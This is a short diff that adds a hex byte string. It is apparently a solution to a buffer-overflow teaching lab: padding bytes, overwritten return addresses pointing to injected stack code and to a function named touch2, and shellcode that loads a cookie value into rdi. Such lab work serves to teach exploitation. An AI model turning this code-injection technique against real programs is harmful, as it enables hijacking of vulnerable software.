@@ -1,0 +1,9 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+80 E9 63 55 00 00 00 00 /* Return address to injected code at 0x5563e980 */
+29 19 40 00 00 00 00 00 /* Return address to touch2 */
+48 c7 c7 f7 81 7c 17 c3 /* mov cookie to rdi */
+
+
+
